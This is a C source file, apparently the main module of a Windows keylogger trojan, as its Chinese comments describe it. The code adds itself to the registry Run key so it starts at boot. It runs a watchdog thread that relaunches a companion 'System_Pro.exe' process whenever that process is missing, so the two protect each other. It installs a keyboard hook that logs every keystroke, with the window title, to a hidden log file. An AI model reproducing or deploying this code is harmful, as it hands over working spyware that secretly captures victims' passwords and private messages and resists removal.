#include"KeyMonitor.h"
#include<time.h>

/*
*Author: Pluviophile
*Date: 2020.7.20
*
*木马程序主体，主功能部分，此进程单独有一个线程专门
*负责监控保护System_Pro进程，两个进程相互保护
*/

char DIR[MAX_PATH];
char NAME[MAX_PATH];
char EXE_PATH[MAX_PATH];
char LOG_FILE[MAX_PATH];

void _stdcall cf
(
	_In_ const char* k, 
	_In_ const char* t
)
{
	FILE* log=NULL;
	fopen_s(&log,LOG_FILE, "a+");
	if (log == NULL)
		return;
	
	fprintf(log,"title:%s\nkey:%s\n"
				"--------------------"
				"------------------------\n", t, k);
	fclose(log);
}

//进程监控线程
DWORD _stdcall MyThread(LPVOID param)
{
	BOOL hb;
	char Pro[MAX_PATH];

	memset(Pro, 0, MAX_PATH);
	int len = GetAppCurrentDir(DIR);

	memcpy(Pro, DIR, len + 1);
	strncat_s(Pro, "System_Pro.exe", sizeof("System_Pro.exe"));
	while (1)
	{
		int i = 1;
		PROCESSENTRY32 p32;
		HANDLE hPro = CreateToolhelp32Snapshot(TH32CS_SNAPALL, 0);
		p32.dwSize = sizeof(p32);

		hb = Process32First(hPro, &p32);
		while (hb)
		{
			puts(p32.szExeFile);
			if (!strcmp(p32.szExeFile, "System_Pro.exe"))
			{
				i = 0;
				break;
			}
			hb = Process32Next(hPro, &p32);
		}
		if (i)
			CreateNewProcess(Pro);
		Sleep(1);
		CloseHandle(hPro);
	}

	return 0;
}

int WINAPI WinMain
(
	HINSTANCE hInstance,
	HINSTANCE hPrevInstance,
	LPSTR     lpCmdLine,
	int       nShowCmd
)
{
	DWORD pid;
	int Dlen = GetAppCurrentDir(DIR);
	int Nlen = GetApplicationName(NAME);
	int Flen = GetAppCurrentPath(EXE_PATH);
	memcpy(LOG_FILE, DIR, Dlen + 1);

	//写入注册表，保证开机自启
	WriteRegedit(
		"SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run",
		EXE_PATH);
	strncat_s(LOG_FILE, "KeyLog.log", strlen("KeyLog.log"));
	
	HANDLE hThread = CreateThread(NULL, 0, MyThread, NULL, 0, &pid);
	if (hThread == NULL)
		ExitThread(pid);

	HHOOK h;
	InitializeKeyMonitor(cf, &h);
}
